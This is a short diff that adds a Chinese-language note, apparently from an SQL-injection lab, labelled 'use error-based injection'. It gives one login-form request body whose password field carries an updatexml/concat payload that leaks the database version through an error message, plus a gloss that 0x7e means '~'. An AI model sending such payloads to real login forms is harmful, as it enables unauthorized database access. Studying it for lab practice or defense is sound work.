@@ -1,0 +1,3 @@
+使用报错注入
+uname=admin&passwd=123' or updatexml(1,concat(0x7e,version(),0x7e),1) --+&submit=Submit
+（0x7e表示～）
